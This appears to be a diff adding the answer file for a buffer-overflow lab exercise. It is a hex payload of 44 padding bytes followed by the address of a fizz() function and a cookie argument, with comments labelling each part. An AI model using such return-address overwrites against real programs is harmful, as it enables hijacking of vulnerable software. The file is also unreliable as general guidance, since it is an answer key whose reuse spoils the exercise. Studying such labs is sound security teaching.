@@ -1,0 +1,8 @@
+/* Padding required:                 44 bytes */
+
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
+/* fizz() located at: 0x08048cba */
+ba 8c 04 08
+00 00 00 00
+/* fizz() need an argv Cookie 0x19fab2c4 */
+c4 b2 fa 19
